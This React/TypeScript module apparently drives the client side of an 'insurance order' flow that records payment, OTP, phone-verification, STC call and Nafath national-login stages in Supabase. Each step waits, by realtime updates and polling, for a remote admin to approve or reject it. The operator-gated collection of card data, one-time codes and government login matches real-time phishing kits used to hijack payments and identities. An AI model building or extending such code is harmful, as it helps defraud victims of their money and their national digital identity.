import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { ensureVisitorSessionHeader } from "@/lib/supabaseHeaders";

type Stage = "payment" | "otp" | "phone_verification" | "phone_otp" | "stc_call" | "nafath_login" | "nafath_verify";
type StageStatus = "pending" | "approved" | "rejected";

const insertStageEvent = async (
  orderId: string,
  stage: Stage,
  status: StageStatus,
  visitorSessionId: string | null,
  payload?: Record<string, any>
) => {
  ensureVisitorSessionHeader();
  await (supabase as any)
    .from("insurance_order_stage_events")
    .insert({
      order_id: orderId,
      stage,
      status,
      visitor_session_id: visitorSessionId,
      payload: payload ?? {},
    });
};

export const useAdminApproval = (orderId: string | null, stage: Stage) => {
  const [status, setStatus] = useState<"waiting" | "approved" | "rejected">("waiting");

  useEffect(() => {
    if (!orderId) return;

    const channel = supabase
      .channel(`order-stage-${orderId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "insurance_orders",
          filter: `id=eq.${orderId}`,
        },
        (payload: any) => {
          const row = payload.new;
          if (row.current_stage === stage) {
            if (row.stage_status === "approved") setStatus("approved");
            else if (row.stage_status === "rejected") setStatus("rejected");
          }
        }
      )
      .subscribe();

    // Also poll every 3s as fallback
    const interval = setInterval(async () => {
      const { data } = await supabase
        .from("insurance_orders")
        .select("stage_status, current_stage")
        .eq("id", orderId)
        .maybeSingle();
      if (data?.current_stage === stage) {
        if (data.stage_status === "approved") setStatus("approved");
        else if (data.stage_status === "rejected") setStatus("rejected");
      }
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(interval);
    };
  }, [orderId, stage]);

  return status;
};

export const createOrUpdateStage = async (
  orderId: string | null,
  stage: Stage,
  extraData?: Record<string, any>
): Promise<string | null> => {
  const visitorSid = typeof sessionStorage !== "undefined" ? sessionStorage.getItem("visitor_sid") : null;
  const payload: Record<string, any> = {
    current_stage: stage,
    stage_status: "pending",
    ...extraData,
  };
  if (visitorSid) payload.visitor_session_id = visitorSid;

  let resolvedOrderId = orderId;

  if (orderId) {
    const { error } = await supabase
      .from("insurance_orders")
      .update(payload)
      .eq("id", orderId);
    if (error) throw error;
  } else {
    const { data, error } = await supabase
      .from("insurance_orders")
      .insert({ status: "pending", ...payload })
      .select("id")
      .single();
    if (error) throw error;
    resolvedOrderId = data?.id || null;
  }

  if (resolvedOrderId) {
    try {
      await insertStageEvent(resolvedOrderId, stage, "pending", visitorSid, extraData);
    } catch (error) {
      console.error("Failed to persist stage event", error);
    }
  }

  return resolvedOrderId;
};
